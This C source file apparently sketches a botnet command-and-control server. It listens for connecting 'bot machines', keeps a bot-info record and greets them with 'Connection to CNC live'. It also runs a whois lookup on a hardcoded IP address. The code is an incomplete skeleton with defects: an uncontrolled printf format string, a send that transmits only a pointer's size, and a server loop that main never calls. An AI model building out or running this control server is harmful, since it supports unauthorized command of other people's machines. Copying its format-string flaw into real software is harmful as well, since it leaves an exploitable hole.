#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>

#define PORT "3490" // The port the bot machines will connect to

#define BACKLOG 100 // Max number of connections

struct bot_info {
	char* ip;
	char* system_name;
	char* os_ver;
};

void sigchld_handler(int s) {
	// waitpid() could overrite errno, we need to save it
	int saved_errno = errno;

	while(waitpid(-1, NULL, WNOHANG) > 0);

	errno = saved_errno;
}

int hostname_to_ip(char* hostname, char* ip) {
	struct hostent *he;
	struct in_addr **addr_list;
	int i;

	if ((he = gethostbyname(hostname)) == NULL) {
		herror("gethostbyname");
		return 1;
	}

	/** Add the host to the address list **/
	addr_list = (struct in_addr**) he->h_addr_list;
	for (i = 0; addr_list[i] != NULL; i++) {
		// Grab the first host
		// TODO - Fix deprecated ntoa
		strcpy(ip, inet_ntoa(*addr_list[i])); 
		return 0;
	}
	return 0;
}

int whois_query(char* server, char* query, char** response) {
	char ip[32], message[100], buffer[1500];
	int sock, read_size, total_size = 0;
	struct sockaddr_in dest;

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;

	printf("Resolving %s...", server);
	if (hostname_to_ip(server, ip)) {
		printf("Resolution failed...");
		return 1;
	}
	printf("Resolved: %s", ip);
	dest.sin_addr.s_addr = inet_addr(ip);
	dest.sin_port = htons(43);

	// Connect to remote server
	if (connect(sock, (const struct sockaddr*)&dest, sizeof(dest))) {
		perror("Connection failure");
	}
	printf("\nQuerying for... %s ...", query);
	sprintf(message, "%s\r\n", query);
	if (send(sock, message, strlen(message), 0) < 0) {
		perror("send failed");
	}

	// Grab the response
	while ((read_size = recv(sock, buffer, sizeof(buffer), 0))) {
		*response = realloc(*response, read_size + total_size);
		if (*response == NULL) {
			printf("realloc failed");
		}
		memcpy(*response + total_size, buffer, read_size);
		total_size += read_size;
	}
	printf("Done");
	fflush(stdout);

	*response = realloc(*response, total_size + 1);
	*(*response + total_size) = '\0';

	close(sock);
	return 0;
}

void get_whois(char* ip, char** data) {
	char *wch = NULL, *pch, *response = NULL;

	if (whois_query("whois.iana.org", ip, &response)) {
		printf("whois lookup failed");
	}
	pch = strtok(response, "\n");
	while(pch != NULL) {
		wch = strstr(pch, "whois.");
		//if (wch != NULL) {
		//		break;
		//}
		printf("\n%s", pch);
		char* org = strstr(pch, "organisation");
		if (org != NULL) {
			printf(org);
		}
		// Move to next line
		pch = strtok(NULL, "\n");
	}
	

	if (wch != NULL) {
		printf("\nWhois server is: %s", &wch);
		whois_query(wch, ip, data);
	} else {
		*data = malloc(100);
		strcpy(*data, "No whois data");
	}

	return;
}


void *get_in_addr(struct sockaddr *saddr) {
	if (saddr->sa_family == AF_INET) {
		return &(((struct sockaddr_in*)saddr)->sin_addr);
	}
	return &(((struct sockaddr_in6*)saddr)->sin6_addr);
}

int server_loop() {
	int sockfd, newfd;
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_storage bot_addr;
	socklen_t sin_size;
	struct sigaction sa;
	int yes = 1;
	char s[INET_ADDRSTRLEN];
	int rv;
	struct bot_info botstat[BACKLOG];
	
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	if ((rv = getaddrinfo(NULL, PORT, &hints, &servinfo)) != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		return 1;
	}

	for (p = servinfo; p != NULL; p = p->ai_next) {
		if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			perror("server: socket");
			continue;
		}

		if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
			perror("setsockopt");
			exit(1);
		}

		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
			close(sockfd);
			perror("server: build");
			continue;
		}
		break;
	}

	freeaddrinfo(servinfo);

	if (p == NULL) {
		fprintf(stderr, "server: failed to bind\n");
		exit(1);
	}

	if (listen(sockfd, BACKLOG) == -1) {
		perror("listen");
		exit(1);
	}

	sa.sa_handler = sigchld_handler;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESTART;
	if (sigaction(SIGCHLD, &sa, NULL) == -1) {
		perror("sigaction");
		exit(1);
	}

	printf("server: waiting for connections...\n");

	const void* sendBuf = "Connection to CNC live";
	while(1) {
		sin_size = sizeof bot_addr;
		newfd = accept(sockfd, (struct sockaddr *)&bot_addr, &sin_size);
		if (newfd == -1) {
			perror("accept");
			continue;
		}	

		inet_ntop(bot_addr.ss_family, get_in_addr((struct sockaddr *)&bot_addr), s, sizeof s);
		printf("server: got connection from %s\n", s);
		botstat->ip = s; // Stash the IP address to be stored later

		if (!fork()) {
			close(sockfd);
			if (send(newfd, sendBuf, sizeof(sendBuf), 0) == -1)
				perror("send");
			close(newfd);
			exit(0);
		}
		close(newfd);
	}
	return 0;
}

int main(int argc, char* argv[]) {
	char ip[100], *data = NULL;
	strcpy(ip, "77.65.12.44");

	get_whois(ip, &data);
	puts(data);

	free(data);
	return 0;	
}
